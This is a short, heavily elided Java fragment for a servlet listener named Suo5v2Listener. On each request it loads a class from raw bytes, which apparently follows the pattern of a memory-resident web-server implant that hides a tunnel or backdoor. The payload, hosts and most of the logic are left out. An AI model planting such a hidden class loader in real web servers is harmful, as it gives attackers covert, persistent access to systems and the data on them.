 ...
 * @since 2025/12/9
 */
public class Suo5v2Listener extends ClassLoader implements ServletRequestListener {
    ...
    protected Suo5v2Listener(ClassLoader parent) {
        super(parent);
    }
    ...
    public void requestInitialized(ServletRequestEvent servletRequestEvent) {
        ...
        try {
            if (suo5V2Class == null) {
                ...
                suo5V2Class = new Suo5v2Listener(Thread.currentThread().getContextClassLoader()).defineClass(bytes, 0, bytes.length);
            }
